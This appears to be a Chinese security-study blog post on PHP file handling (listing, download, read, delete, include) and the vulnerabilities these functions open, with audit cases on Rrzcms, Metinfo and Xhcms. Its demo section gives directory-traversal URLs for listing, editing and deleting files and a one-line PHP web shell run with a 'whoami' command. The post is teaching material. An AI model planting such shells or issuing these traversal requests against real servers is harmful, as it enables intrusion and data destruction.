---
title: PHP应用&文件操作安全&上传下载&任意读取删除&目录遍历&文件包含
published: 2026-02-11 21:00:00
description: PHP中的文件遍历、上传、下载、删除、编辑、包含等功能的介绍以及相关漏洞，三个案例（遍历、下载、包含）。
tags: [Web开发,PHP]
category: 网络安全
draft: false
---

# 知识点

1. 安全开发-原生PHP-文件安全操作
2. 安全开发-原生PHP-上传读取删除包含等
3. 安全开发-原生PHP-代码审计文件安全

## 文件遍历上传下载删除编辑包含等

`$_FILES`：PHP中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，并将其保存到服务器上。它是一个包含上传文件信息的数组，包括文件名、类型、大小、临时文件名等信息。

`$_FILES["表单值"]["name"]` ：获取上传文件原始名称

`$_FILES["表单值"]["type"]` ：获取上传文件MIME类型

`$_FILES["表单值"]["size"] `：获取上传文件字节单位大小

`$_FILES["表单值"]["tmp_name"] `：获取上传的临时副本文件名

`$_FILES["表单值"]["error"] `：获取上传时发生的错误代码

`move_uploaded_file()`：将上传的文件移动到指定位置的函数

## 文件显示

1. 打开目录读取文件列表
2. 递归循环读取文件列表
3. 判断是文件还是文件夹
4. `PHP.INI`目录访问控制

### is_dir

`is_dir()` 函数用于检查指定的路径是否是一个目录

### opendir&readdir

`opendir()` 函数用于打开指定的目录，返回句柄，用来读取目录的文件和子目录

`readdir()` 函数用于从打开的目录句柄中读取目录中的文件和子目录

```php
//与scandir同样效果
$getfile = opendir($path);
while(($file = readdir($getfile)) != false) {
    echo $file.'<br>';
}
```

### open_basedir

`open_basedir`：`PHP.INI`中的设置用来控制脚本程序访问目录

### scandir

`scandir()` 函数返回指定目录中的文件和目录列表，以数组形式返回

```php
<?php

$path = "F:\\StudySoftware\\CODE\\phpstudy\\phpstudy_pro\\WWW";
$files = scandir($path);
foreach ($files as $file) {
    echo $file . '<br>';
}


?>
```

### ini_set

`ini_set('open_basedir',__DIR__); `设置配置文件中，只能访问本目录

## 文件删除

### 文件删除函数

unlink()

```php
unlink('filename');
```

调用命令删除：system shell_exec exec等

```php
system('del filename')
```

## 文件下载

修改HTTP头实现文件读取解析下载：

`header("Content-Type: application/octet-stream");`

`header("Content-Disposition: attachment; filename=\"" . $file . "\"");`

`header("Content-Length: " . filesize($file));`

`readfile($file);`

```php
//修改访问者的回显数据包的头让浏览器解析成下载协议
$file = '1.txt';
header("Content-Type: application/octet-stream");
header("Content-Disposition: attachment; filename=\"" . $file . "\"");
header("Content-Length: " . filesize($file));
readfile($file);
```

## 文件读取

### file_get_contents

`file_get_contents() `读取文件内容

```php
echo file_get_contents('file.php');
```

## fopen&fread

` fopen()、fread() `文件打开读入

```php
//文件读取
$file = fopen('file.php','r+');
$data = fread($file,filesize('file.php'));
echo $data;
fclose($file);
```

## 文件包含

include、require、include_once、require_once等

```php
//文件包含
//包含即执行，相当于包含文件以php代码执行 任何后缀都可以

//require()语句在遇到包含文件不存在，或是出错的时候，就停止即行，并报错;
//include()则继续执行,只会显示一个警告错误
//require()会在PHP程序执行前，就先读入require所指定的文件;
//而include()会放在流程控制的处理部分中，也就是当PHP执行到include文件时，才将指定的文件读入;
//用通俗易懂的话说就是：include在用到的时候才加载，而require在一开始就加载了.所以在运行机制上，require()的效率相较于include()会稍微高一些。但是也正因为这种特性，include可以应用到条件语句内执行，而require()因为在程序被执行前就先引入文件，所以即使设定了判断语句来执行require()，无论true还是false，都会被执行
include('file.php');
require('file.php');
//include_once()函数的作用与include相同，不过它会首先验证是否已经包含了该文件,如果已经包含，则不再执行include_once,否则，则必须包含该文件,除了这一点与include完全相同
//reclude_once()函数的作用与reclude相同,语句在脚本执行期间包含并运行指定文件,此行为和 require() 语句类似，唯一区别是require_once()会先判断一下这个文件在之前是否已经被包含过，如已经包含，则忽略本次包含
include_once('file.php');
require_once('file.php');
```

## 演示案例0

文件遍历漏洞：

查看文件：

```url
http://ip:port/day6/filemanager.php?dir=c:\
```

修改功能：

```url
http://ip:port/day6/filemanager.php?dir=.&edit=../day5/tp5/build.php
```

删除功能：

```url
http://ip:port/day6/filemanager.php?dir=../../../../../../&delete=important.txt
```

编辑功能：

任意一个php文件写入：

```php
<?php system($_GET['cmd']); ?>
```

之后访问：

```url
http://ip:port/day6/test3.php?cmd=whoami
```

## 代码审计案例

### Rrzcms遍历读取

https://xz.aliyun.com/t/10932

![image-20260211205018666](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211205018666.png)

![image-20260211205028855](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211205028855.png)

#### 黑盒角度

路径访问：

![image-20260211205057836](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211205057836.png)

![image-20260211205106292](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211205106292.png)

![image-20260211205122367](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211205122367.png)

修改文件：

![image-20260211205206254](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211205206254.png)

![image-20260211205236192](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211205236192.png)

#### 白盒角度

![image-20260211205702687](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211205702687.png)

![image-20260211205713497](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211205713497.png)

![image-20260211205723975](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211205723975.png)

![image-20260211205743576](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211205743576.png)

### Metinfo文件下载

https://mp.weixin.qq.com/s/te4RG0yl_truE5oZzna3Eg

![image-20260211210617230](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211210617230.png)

![image-20260211210641420](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211210641420.png)

![image-20260211210657825](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211210657825.png)

![image-20260211210713084](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211210713084.png)

![image-20260211210735556](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211210735556.png)

### Xhcms文件包含

https://xz.aliyun.com/t/11310

![image-20260211210923988](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211210923988.png)

![image-20260211210935089](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211210935089.png)

![image-20260211210958750](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260211210958750.png)
